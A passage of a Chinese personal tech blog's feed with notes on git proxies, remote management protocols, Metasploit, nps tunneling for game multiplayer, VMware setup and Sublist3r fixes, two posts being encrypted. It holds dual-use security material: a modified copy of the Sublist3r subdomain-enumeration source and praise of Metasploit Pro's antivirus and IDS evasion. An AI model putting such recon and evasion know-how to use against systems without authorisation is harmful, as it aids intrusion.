      <url>/2024/06/19/hexo%20d%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy 127.0.0.1:xxxx</span><br><span class="line">git config --global https.proxy 127.0.0.1:xxxx</span><br></pre></td></tr></table></figure><p>​命令中的<strong>主机号</strong>（127.0.0.1）是使用的代理的主机号（自己电脑有vpn那么本机可看做访问github的代理主机），即填入127.0.0.1即可，否则填入代理主机 ip(就是网上找的那个ip)<br>​命令中的<strong>端口号</strong>（xxxx）为代理软件（代理软件不显示端口的话，就去Windows中的代理服务器设置中查看）或代理主机的监听IP，可以从代理服务器配置中获得，否则填入网上找的那个端口port。</p><h3 id="查看代理"><a href="#查看代理" class="headerlink" title="查看代理"></a>查看代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config -l</span><br><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br></pre></td></tr></table></figure><h3 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global --unset-all http.proxy</span><br><span class="line">git config --global --unset-all https.proxy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪协议漏洞</title>
      <link href="/2024/06/18/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2024/06/18/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="600c6802129bfb537bd29226a14433cea4ffca6ee59aa1286bd5b295cf193243">87c5da862cc50496c177a39b6540143991a21dfcff4a8e83b7a26b6fbd6eb1d92cf0c7dd665f7ee2d1b97e064544d15f2f981dcbdc87e5ea0844d842d1c9987afa7fe4e93d9dc87e47da37e54d143d6ac03772c2f45e4732cd198aefd91ea1edaf4721a9baef19f0130cab608066b2dcbf1f396cee56afdf0a0a79efb79fe0be470f572a370a37239384154a838fb9b143ed68f4b7ae2d9a8068938e4ae7d5e1fb99394f9f46034627ae48a190231aa79bedb611ff62792b504232e7402abf5c9e5210b310947ed86e0f375019cf05b0e8feda5d8b9ed38d9301eb73b6786a34d3e9dcca42f33df905983c1e2471b58995c78affeb991a3722225843042a245d214d910c239f231dc31d195d490abf0db223e1c34530dd75c10e138bb22654cbc10c753a50d561563bb9c4e9b67409e419a2e34f1bfb12c3ffc0c724f72392162e6aa88fc1cbdf25ba3b04ed83449a99b130d32d16ea279fdf06baaa8234eaf92c9e9e47516898f408b80ca3aaa0afe37066b9acbae9169cda5c542838b28378850c6b8eb6bc34e51d5081218c875ac2d0483e2f3943771c228d9066903771ed63cc4b08f80225ff01f81eb4251c471a0887ac34bf4162509885670077adc176d452090dfaf0a676e354069c86c313016aa94419a4e7df5705e267e63af493f9d76ca50cd982b427accdd8a5cfba6bea29056a63d10ac51b1734b95edea406c68b546dcd62f17ae12a8fd98fdd04aecd3000b1714edab0cde1f577614068d6a7e6f8922878427b29c094d326a1c7b31948e269a6b082085eaa68f771365e28431e39b59f458a7f94e5a273cf769042a492a9a77f4f3947bf7904aa02e3471cf6eecf99f53f7e5a7232c6cb25a882dfa9cd33eca8c8e7ead81645008bc6eb17c40ba74f37540ba5ffc6433df163f842cc06dd371ed7185e10ec503b3032e591cc06941974cb151249dd431e16b229782767c0caf950bbc4f40f4d28060499d309cd822bcf2ff0f59fb6e29a356f45c73874283fd6c02ad3467b4f11f54600ab2e1ca87ce136209678329bf0ed49d295ac04d2c552c21d4c711e1b23f235d6eb700d3c63875b8532586d90044e278b185c885885d94a6f46d5ba6e96bb462722d26482eba9ac5d1a046ae5170ebc693368e53100e8212903998009422430c5a07c1714934df3c569f7aa3d5d32b13e6a9f5683812f56a6f4933a6e19fe31b54df1aa9c2ad14931b22b17f78727aa3ff908c9d0d4dc203cfe5289061b3361f33db7503ee36c19eb067f1719fc8e8d03557318f7bcdc2a9826edcbdc04561c12255770242a64d837db726514e8c7df6a357a608876ff31d685ed016690c027d7d6a04bbd60cca3aec22687604a58295c50b8f2b8ea858ea547fc03bbea169bfc30ce1ddced9a1afa3e819aea6f82e40b9a79f0ad0003dcba8339657e02309eb3e28693ada85ab298fa3be2c10e6c751f5b3ef47e73f43edcf4cb97a23927bb573f08d05183bf633380af78fa08c9728d859c9f326bceeb8624b4f99c5bc12ef592a0702ab2a1dc1d3d22de96f3dffa1a329ab3f74fcda9e35bbc2a2228b461c7fe0147f4934908d73db3a5d850409848863749155e06c382a14bbf946f8c9bc040a361d6fab337b71bb32cd29580a17d400f03fb124dc6e7bcbb0a690a59e1f5e1d56cff7c68663bc09943b693b6a09210822c0c79ab40d8ac8ad5e6a05a2bb226b6d9b9ac322cce650453d5901cfd57a1be94a249db7a3529e5311fd9187d86d70abbe7704b24fe2baaf89cfed69740cd4ff95ed58005638f7673fecd17865095e978bd0904a67b1a1361eee275da03869fec903dd728b523068cbc25b33046a2985ac981192d30d7ed00de7e73fc729cd389879dd6c27712bffd72b063f41c7948933b7e2e820baf18b04b944f6a197d74ade1475a5ce9521774174ea9e27f06b24c9f7d91cebac617efe192ef7168651b787ab3881172f9d2256d2465439edff2ce511cd9a7833549f59672b7537ae161679870c4dec627d02a3d7712d2c0a0ffdb75efbf6ada093682d8c02b4958342d2270b5009130e32e969979d9b0046a692f6ea8fce42640759e31d65979dd2ae9b93fdefa88a95aaf7b3a9583fc415b7a60878a70dc7777b2192fd5a72583bebf1bb4ec68eb2ef7f39ea2760478b820017c71fe36788388cee05827df8f92ae862c6a9da9d223ba35eedf18bb1f9eca552c9cf69a924f35f70be544584e09caebd682ed31e6f39ae88f86d3c30498ff76b5b149713ef9c7bbf51b26f3a1a40041cf5b59ffab7dfef74827fce080ee00772afc907edb8086896103032fc203fd9145496965a4abee7c9f3c688ff9e49cdaf370f3bb7606ad855a9305f63c62e70392fa92df138a0d8c2c594137d7be2b99e48cffafde89369a0b9dda7ab1b4a10b004532e4af3d0dcd65bfd904f167df52bbc581fc0718eb183557fbc016df801b72f5fc708615c5c7ca234a2e0d7b943f179375a7b2b65c82a0f9326a8bfba6d6c71198b564ae1d72bb2850d2f60587ac73466f5b14d6ba79b7768e86ab510cca4a4ff3158f7207b761ba7b3c7d1403f30cf184f537ccbe3c4fc8ae3540ef2271847deee2d6d93642bca7817f01d58e87139d48dc92f7db554e5a42fb1744a7764d924b8e83bc33c511b4b39a628f070c6722e9e2801c5b9753f54087460aa6db3562907ffb62fae0ac4d04b7cac46e7ecbdcd6571bfe940aedb6fe960aaf21ff44cdf5111cb2fad67fc09065e696f7627f04b353e8efe933f6424f4fbb4017b9da0f1441ae1df5a92c0ca9d33b3bff9facb531c541f43348ab5e16955c2d648e8868cdbd38afe4be5e923d074d7cd6990c808fe747ce470aef24b6ad48d3d115ecd51dc94c528c94fe31a9197c8995a84bd85a5939987a3030652510309e54a126f45884b06566424ecba8c8da694074bd246ce2954d2da996a26cefd204a4f5b0f87c7eadbde2da0227ed548292a8c057b1fe62be7963e40054a3de362bb45df663d97772e6fe6f47fe50703153dc0478f082ca916fe6e4bda1b74b372f3b3b20dd1e65da35ef4864f2dd8ec599c0e047680283cdf868b17b77e15f87598f5659fc184465a901988c59dbc0ded2925eb1feab0d8464f29bf738547f8ef8633a3cf11284681575fc32a3536b4aac76d22ad0a05262769ce4ca6744447c2cc5f0e694ff7407a8b5903f9c2565c7d725a67457bb2d5cc4462bfff5a349b09290ff4daadd34f2991d9ed2bf27cf45c56992e1283a0917501079d6959732ea31820a677db1c9f1ede21711d09b7caa729861fec3daca195a83761ed29a4421a76280fb4f09f7084b314a5ab51c56edd31b4e8a80ce039f5c00987b3d955826430dd0017b5efd35b99f1258d95e86fae5b38edf917aef0813720957b276d375a3c8d4e2a2df1176163632ddd9b4eeb7060551cf9b47c5ce1569f75628d6d25e6879a1b7f5fd531c5282ee2f9a9e888e7a52990bbdcf03f3a3bfba5f72dcc09f260ab9a0830cd6c95ddf5b3e84b2a774babcffd417cf33fd7f1159bfdaaac6dbaefdce5153b37496332035c8be14fc5cdd592850791cc3e2c01e9f329b6f07d1e16a58fce81934f3976d6b8d3b0f43edddd2c61fc9b5615d97120f593fc871cc0eab992cd36873cc7f996693cbba5c30f6cc35e1ce63b2c8bbababb96b015e531c7b76df7fb806872d5ba61384ea02784c0a7a18623c8570b216ef97165087eccba7db</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程管理协议</title>
      <link href="/2024/06/18/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/06/18/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>提到远程管理，通常指的是远程管理服务器，而非个人计算机。个人计算机可以随时拿来用，服务器通常放置在机房中，用户无法直接接触到服务器硬件，只能采用远程管理的方式。</p><p>远程管理，实际上就是计算机（服务器）之间通过网络进行数据传输（信息交换）的过程，与浏览器需要 HTTP 协议（超文本传输协议）浏览网页一样，远程管理同样需要远程管理协议的支持。</p><p>目前，常用的远程管理协议有以下 4 种：</p><ul><li>RDP（remote desktop protocol）协议：远程桌面协议，大部分 Windows 系统都默认支持此协议，Windows 系统中的远程桌面管理就基于该协议。</li><li>RFB（Remote FrameBuffer）协议：图形化远程管理协议，VNC 远程管理工具就基于此协议。</li><li>Telnet：命令行界面远程管理协议，几乎所有的操作系统都默认支持此协议。此协议的特点是，在进行数据传送时使用明文传输的方式，也就是不对数据进行加密。</li><li>SSH（Secure Shell）协议：命令行界面远程管理协议，几乎所有操作系统都默认支持此协议。和 Telnet 不同，该协议在数据传输时会对数据进行加密并压缩，因此使用此协议传输数据既安全速度又快。</li></ul><h1 id="RDP-对比-RFB"><a href="#RDP-对比-RFB" class="headerlink" title="RDP 对比 RFB"></a>RDP 对比 RFB</h1><p>RDP 协议和 RFB 协议都允许用户通过图形用户界面访问远程系统，但 RFB 协议倾向于传输图像，RDP 协议倾向于传输指令：</p><ul><li>RFB 协议会在服务器端将窗口在显存中画好，然后将图像传给客户端，客户端只需要将得到的图像解码显示即可；</li><li>RDP 会将画图的工作交给客户端，服务器端需要根据客户端的显示能力做适当的调整。</li></ul><p>因此，完成相同的操作，使用 RFB 协议传输的数据量会比 RDP 大，而 RDP 对客户端的要求比 RFB 更苛刻，RFB 适用于瘦客户端，而 RDP 适用于低速网络。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">瘦客户端是相对于胖客户端而言的，比如，人们使用  QQ，需要下载客户端，这属于“胖客户”；反之，通过浏览器就可查阅网络上各种资料，无需再下载其他任何软件，这属于“瘦客户”。简单理解，瘦客户端指的是最大可能减轻客户端的负担，多数工作由服务器端完成；胖客户端则相反。</span><br></pre></td></tr></table></figure><h1 id="Telnet-对比-SSH"><a href="#Telnet-对比-SSH" class="headerlink" title="Telnet 对比 SSH"></a>Telnet 对比 SSH</h1><p>Telnet 协议和 SSH 协议都是命令行远程管理协议，有共同的应用领域，常用于远程访问服务器。</p><p>相比 Telnet 协议，SSH 协议在发送数据时会对数据进行加密操作，数据传输更安全，因此 SSH 协议几乎在所有应用领域代替了 Telnet 协议。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/2024/06/18/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/06/18/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="95fb2c05b99731b03f129a5155545f2ec472dc0fa428b2ef6a65ff68961017d6">87c5da862cc50496c177a39b65401439c4949d2d7040679d3f16fdbda4818ddf743b6b1f10332514d656be43eb3280ef0c58bde21d6d60cfbecb5aa7527d8ac6276fb8fd710b2269a95ce290825c47a00b0b414b26aefa92752306d70a8ccd4e59ce50226b31e537a63bfcd302349d7e56428da14a1522b42f69abce9fed1b4f4511283aeef32687ea1ec36c5927b7a3b3d55f09ae33ef909cc945b3f66300ee1eeca06927509df8e5f8fc0709520a93f10009e6d64c4b3be029235ec0e950f66237f425be9b7abc9bf59d12351faeb9f2cbb6a9a90e77ae4ecfbdce57452d6500310679273f97c60307cbef6d9e5d5c0679a91ba943f76920c33c4b97af1405c2f694ab92dad55c6c6c1523ea93bdcfb78f59796a14a3a203e6ef270ae1b62d014877675e40200df5fcdf00b19b991a8618c6a9320043dcf5449c440ebddb286d4831421d26d8db611477124c2005ecbd8d6440e6e6c3537644376a300c5266194b864bd6e80f3d9b0eb45ac0e2590eaacc4affb9cc052ed59b3d8b2ef4cd76b768ab361f41b122c624fb0004839b3985d1053595eeb12e1d903e91d5ea37fa5c3446a47e83c61acf49a57b80096dc930eb2f90d507ca274f2993a40126fca00e4ccf0a0e49072adf5e179f941ec3330b9289750017acf8eda6e2c5a0fb696c52abcb17ce4b033f077d44de1ebd5e29a68aea52534a8d0168f43d0c7c88e123524cf371be36183b67e0b821e2fc62ecf337fe6e77fb878949825c2b713a2824cb71a7f0dad65618b217bc4f9b0bb73146cbaff66b790f43d9ead8856433737dffea5e7467ee938c7236b6e7b8e4469a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf</title>
      <link href="/2024/06/01/msf/"/>
      <url>/2024/06/01/msf/</url>
      
        <content type="html"><![CDATA[<p>Metasploit就是一个漏洞利用框架，全称是The Metasploit Framework，简称MSF，使用ruby语言编写的，语法类似python。</p><p>关于版本<br>社区版：<br>集成在 kali 系统中，目前基于社区力量维护。早期版本需要先启动数据库再启动 MSF，从msf5版本以<br>后已经集成到 msf 里面了，可以直接一键启动。现在已经是msf6了<br>Pro 版：企业版（收费，但可以试用）的几个优势<br>1、企业版出的检测报告非常强大，给客户汇报起来很方便。<br>2、AV 免杀，社区版的免杀大家都知道了，但是企业级的免杀他们说过可以达到百分之九十甚至百分之百。<br>3、IDS &#x2F; IPS 绕过（入侵检测系统&#x2F;入侵防御系统）<br>4、VPN Pivotin</p><p>未完待续……</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nps搭建内网穿透</title>
      <link href="/2024/06/01/nps%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2024/06/01/nps%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-下载nps"><a href="#1-下载nps" class="headerlink" title="1 下载nps"></a>1 下载nps</h1><p>下载地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a> </p><p>我的阿里云服务器是centos的，就下载linux_amd64_server.tar.gz了。</p><p>客户端选择Windows版本windows_amd64_client.tar.gz</p><h1 id="2-安装nps服务端"><a href="#2-安装nps服务端" class="headerlink" title="2 安装nps服务端"></a>2 安装nps服务端</h1><p>利用finalshell把linux_amd64_server.tar.gz上传到&#x2F;opt&#x2F;packages</p><p><img src="/img/20220622180411.png"></p><p>进入&#x2F;opt&#x2F;packages执行解压命令，解压到&#x2F;opt&#x2F;programs。</p><p><code>tar zxvf linux_amd64_server.tar.gz -C /opt/programs</code> </p><p><img src="/img/20220622180601.png"></p><p>进入conf文件夹，打开编辑nps.conf文件。</p><p><img src="/img/20220622180722.png"></p><p>这个bridge_port的8042端口需要我们在阿里云开通此端口的防火墙入站规则。底层通信端口，默认8024，使得客户端可以连接到服务端通讯端口。</p><p><img src="/img/20220622180907.png"></p><p>以下几处需做修改，web_port同样需要在阿里云控制台开通此端口的防火墙入站规则。</p><p><img src="/img/20220622181446.png"></p><p>改完之后Ctrl+s保存，然后输入<code>./nps install</code> 进行安装。</p><p><img src="/img/20220622182102.png"></p><p>输入nps -version看到版本说明安装成功。</p><p><img src="/img/20220622182232.png"></p><p>输入nps start启动服务。</p><p><img src="/img/20220622182355.png"></p><p>然后去阿里云控制台的安全组规则开放刚刚那两个端口。</p><p>接着就是浏览器访问云服务器ip的nps控制台的端口号，但是我一直访问失败。</p><p><img src="/img/20220622201913.png"></p><p>查看日志<code>cat /var/log/nps.log</code>，发现报错80端口被占用，想起来是因为我在云服务器的80端口部署了一个WordPress，而nps的http监听端口，默认80。</p><p><img src="/img/20220622210702.png"></p><p>下面我给它改成81端口了。443端口是https的监听端口，如果冲突了也可以顺便改一下，我没有冲突就不改了。</p><p><img src="/img/20220622201840.png"></p><p>当然，81端口也需要在阿里云开放一下。</p><p><img src="/img/20220622202246.png"></p><p>然后执行<code>whereis nps</code>，进入出现的目录，删掉nps，返回nps解压后的目录再重新install。</p><p><img src="/img/20220622211141.png"></p><p>然后<code>nps start</code>启动服务。</p><p>浏览器访问云服务器ip的nps控制台的端口号。</p><p><img src="/img/20220623082216.png"></p><h1 id="3-客户端安装nps"><a href="#3-客户端安装nps" class="headerlink" title="3 客户端安装nps"></a>3 客户端安装nps</h1><p>登入进去后新增一个客户端。</p><p><img src="/img/20220623082353.png"></p><p>压缩和加密都选“是”。</p><p><img src="/img/20220623082519.png"></p><p>把之前下载好的Windows客户端文件解压缩。</p><p><img src="/img/20220623082624.png"></p><p>打开conf文件夹中的npc.conf配置文件，把server_addr改成云服务器ip:8024，vkey改成刚刚新增客户端的唯一验证密钥。</p><p><img src="/img/20220623083142.png"></p><p><img src="/img/20220623083216.png"></p><p>然后把disconnect_timeout&#x3D;60下面的全删了，没啥用。</p><p><img src="/img/20220623083535.png"></p><p>保存之后双击exe文件启动，出现Successful代表成功启动客户端。</p><p><img src="/img/20220623100237.png"></p><p>来到控制台添加一个TCP隧道。</p><p><img src="/img/20220623100139.png"></p><p><img src="/img/20220623102842.png"></p><p>客户端id是2</p><p><img src="/img/20220623100514.png"></p><p>目标端口就是本机的端口，看自己哪个端口需要被别人访问，我是为了星露谷物语联机，首先打开星露谷物语并进入农场，然后在任务管理器的详细信息中找到星露谷物语的PID。</p><p><img src="/img/20220623101455.png"></p><p>然后执行<code>netstat -ano</code>查看PID对应的端口号，星露谷物语是UDP 24642端口，在隧道选择上选择UDP。</p><p><img src="/img/20220623101653.png"></p><p>然后我们可以看到一条UDP隧道就有了。</p><p><img src="/img/20220623103401.png"></p><p>然后另一位星露谷物语玩家就可以通过阿里云服务器的6666端口到我电脑上星露谷物语的24642端口了。</p><p>直接在星露谷物语ip联机界面输入xxx.xxx.xxx.xxx:6666即可联机玩耍。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware</title>
      <link href="/2024/05/28/VMware/"/>
      <url>/2024/05/28/VMware/</url>
      
        <content type="html"><![CDATA[<p>一些设置，避免自己忘了，记录一下。</p><h1 id="桥接网络"><a href="#桥接网络" class="headerlink" title="桥接网络"></a>桥接网络</h1><p>先看自己用的WiFi还是网线，网卡是不同的，不知道就选自动桥接。</p><p>虚拟系统把ip与主机同网段，与主机网关相同。</p><p>主机与虚拟机ping不通就关防火墙和selinux，再不行就虚拟网络编辑中还原默认设置。</p><p><img src="/img/20220616172348.png"></p><p><img src="/img/20220616173412.png"></p><p>kali一开始没有ping通Windows Server 2012是因为防火墙高级设置中入站规则下面这个没打开。</p><p><img src="/img/20220616180224.png"></p><p>右键点击启用规则就行了。</p><h1 id="NAT网络"><a href="#NAT网络" class="headerlink" title="NAT网络"></a>NAT网络</h1><p>NAT网关：192.168.0.1</p><p>子网ip：192.168.0.0</p><p>VMnet8：IP地址192.168.0.2，子网掩码：225.225.225.0</p><p><strong>VMnet8网卡的ipv4要设置成同一网段，不同地址</strong> </p><p><img src="/img/20220616173223.png"></p><h1 id="kali登录界面键盘无法输入"><a href="#kali登录界面键盘无法输入" class="headerlink" title="kali登录界面键盘无法输入"></a>kali登录界面键盘无法输入</h1><p><img src="/img/20220921181754.png"></p><h1 id="文件夹共享"><a href="#文件夹共享" class="headerlink" title="文件夹共享"></a>文件夹共享</h1><p>先改为桥接。</p><p>方法一：在虚拟机内部建立共享文件夹。</p><p><img src="/img/20220925124835.png"></p><p><img src="/img/20220925125022.png"></p><p><img src="/img/20220925125150.png"></p><p>windows：win+r输入<code>\\192.168.148.128</code></p><p>如果没成功，可能是虚拟机的Windows没开启“网络与发现”</p><p>kali：点击文件夹资源管理器的“其他位置”，在输入框输入<code>smb:192.168.148.128</code></p><p>方法二：</p><p>利用VMware的共享文件夹功能。</p><p><img src="/img/20230728193947.png"></p><h1 id="安装windows出现timeout后出现boot-manager"><a href="#安装windows出现timeout后出现boot-manager" class="headerlink" title="安装windows出现timeout后出现boot manager"></a>安装windows出现timeout后出现boot manager</h1><ol><li>在左侧Windows虚拟机上右键-&gt;设置</li><li>左上角“选项”</li><li>最后一项“高级”</li><li>固件类型“BIOS”</li></ol><h1 id="Windows-Server-2012-R2安装VMware-Tool报错"><a href="#Windows-Server-2012-R2安装VMware-Tool报错" class="headerlink" title="Windows Server 2012 R2安装VMware Tool报错"></a>Windows Server 2012 R2安装VMware Tool报错</h1><p>先下载安装这个<a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=42153">Download Windows Server 2012 R2 更新程序 (KB2919442) from Official Microsoft Download Center</a></p><p>再下载安装这个<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=42334">Download Windows Server 2012 R2 更新 (KB2919355) from Official Microsoft Download Center</a></p><p>第一个直接下载就行，第二个选择六百多兆那个下载。</p><p>这两个安装完之后就能安装VMware tool了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublist3r报错</title>
      <link href="/2024/05/28/Sublist3r/"/>
      <url>/2024/05/28/Sublist3r/</url>
      
        <content type="html"><![CDATA[<p>报错信息：</p><p>AttributeError: ‘NoneType’ object has no attribute ‘headers’</p><p>解决方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install --upgrade certifi</span><br></pre></td></tr></table></figure><p>报错信息：</p><p>着色什么什么的</p><p>解决方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install win_unicode_console colorama</span><br></pre></td></tr></table></figure><p>其他报错：</p><p>把sublist3r.py文件内容换成我这个，亲测有效，具体改什么地方我都忘了，被我改好几次了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Sublist3r v1.0</span></span><br><span class="line"><span class="comment"># By Ahmed Aboul-Ela - twitter.com/aboul3la</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modules in standard library</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># external modules</span></span><br><span class="line"><span class="keyword">from</span> subbrute <span class="keyword">import</span> subbrute</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2.x and 3.x compatiablity</span></span><br><span class="line"><span class="keyword">if</span> sys.version &gt; <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> urllib.parse <span class="keyword">as</span> urlparse</span><br><span class="line">    <span class="keyword">import</span> urllib.parse <span class="keyword">as</span> urllib</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># In case you cannot install some of the required development packages</span></span><br><span class="line"><span class="comment"># there&#x27;s also an option to disable the SSL warning:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#import requests.packages.urllib3</span></span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if we are running this on windows platform</span></span><br><span class="line">is_windows = sys.platform.startswith(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Console Colors</span></span><br><span class="line"><span class="keyword">if</span> is_windows:</span><br><span class="line">    <span class="comment"># Windows deserves coloring too :D</span></span><br><span class="line">    G = <span class="string">&#x27;\033[92m&#x27;</span>  <span class="comment"># green</span></span><br><span class="line">    Y = <span class="string">&#x27;\033[93m&#x27;</span>  <span class="comment"># yellow</span></span><br><span class="line">    B = <span class="string">&#x27;\033[94m&#x27;</span>  <span class="comment"># blue</span></span><br><span class="line">    R = <span class="string">&#x27;\033[91m&#x27;</span>  <span class="comment"># red</span></span><br><span class="line">    W = <span class="string">&#x27;\033[0m&#x27;</span>   <span class="comment"># white</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> win_unicode_console , colorama</span><br><span class="line">        win_unicode_console.enable()</span><br><span class="line">        colorama.init()</span><br><span class="line">        <span class="comment">#Now the unicode will work ^_^</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Error: Coloring libraries not installed, no coloring will be used [Check the readme]&quot;</span>)</span><br><span class="line">        G = Y = B = R = W = G = Y = B = R = W = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    G = <span class="string">&#x27;\033[92m&#x27;</span>  <span class="comment"># green</span></span><br><span class="line">    Y = <span class="string">&#x27;\033[93m&#x27;</span>  <span class="comment"># yellow</span></span><br><span class="line">    B = <span class="string">&#x27;\033[94m&#x27;</span>  <span class="comment"># blue</span></span><br><span class="line">    R = <span class="string">&#x27;\033[91m&#x27;</span>  <span class="comment"># red</span></span><br><span class="line">    W = <span class="string">&#x27;\033[0m&#x27;</span>   <span class="comment"># white</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">no_color</span>():</span><br><span class="line">    <span class="keyword">global</span> G, Y, B, R, W</span><br><span class="line">    G = Y = B = R = W = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;%s</span></span><br><span class="line"><span class="string">                 ____        _     _ _     _   _____</span></span><br><span class="line"><span class="string">                / ___| _   _| |__ | (_)___| |_|___ / _ __</span></span><br><span class="line"><span class="string">                \___ \| | | | &#x27;_ \| | / __| __| |_ \| &#x27;__|</span></span><br><span class="line"><span class="string">                 ___) | |_| | |_) | | \__ \ |_ ___) | |</span></span><br><span class="line"><span class="string">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|%s%s</span></span><br><span class="line"><span class="string">                # Coded By Ahmed Aboul-Ela - @aboul3la</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % (R, W, Y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parser_error</span>(<span class="params">errmsg</span>):</span><br><span class="line">    banner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; [Options] use -h for help&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(R + <span class="string">&quot;Error: 